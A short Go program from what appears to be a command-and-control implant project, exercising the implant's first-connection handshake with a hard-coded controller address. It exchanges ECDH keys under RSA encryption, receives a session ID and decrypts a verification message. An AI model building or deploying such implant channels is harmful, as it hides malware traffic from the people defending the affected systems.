package main

import (
	"bytes"
	"fmt"
	"github.com/lzkking/harle/implant/internal/command"
	"github.com/lzkking/harle/implant/pkg/crypto/aes"
	"github.com/lzkking/harle/implant/pkg/crypto/ecdh"
	"github.com/lzkking/harle/implant/pkg/crypto/rsa"
	"github.com/lzkking/harle/implant/proto"
	"io"
	"net/http"
)

func main() {

	publicKey, privateKey, err := ecdh.GetTmpKey()
	if err != nil {
		panic(err)
	}

	commandData := proto.CommandData{
		DataType: command.FirstConnection,
		Data:     publicKey,
	}

	commandBytesData, err := commandData.Marshal()
	if err != nil {
		panic(err)
	}

	rsaPublicKey, err := rsa.LoadRsaPublicKey()
	if err != nil {
		panic(err)
	}

	encryptData, err := rsa.RsaEncryptData(commandBytesData, rsaPublicKey)
	if err != nil {
		panic(err)
	}

	//10.18.201.56:9087
	resp, err := http.Post("http://10.18.201.56:9087", "application/octet-stream", bytes.NewBuffer(encryptData))
	if err != nil {
		panic(err)
	}

	fmt.Println(resp.Status)

	retData, err := io.ReadAll(resp.Body)

	var cData proto.CommandData
	err = cData.Unmarshal(retData)
	if err != nil {
		panic(err)
	}

	fmt.Println(cData.DataType)

	var cDataRet proto.FirstConnection
	err = cDataRet.Unmarshal(cData.Data)
	if err != nil {
		panic(err)
	}

	fmt.Println(cDataRet.SessionId)
	fmt.Println(cDataRet.PublicKey)

	_, keyRecv, err := ecdh.CalcSessionKey(cDataRet.PublicKey, privateKey, publicKey)
	if err != nil {
		panic(err)
	}

	// 解密
	plaintext, err := aes.DecryptData(keyRecv, cDataRet.Verify)
	if err != nil {
		panic(err)
	}

	fmt.Println(string(plaintext))
}
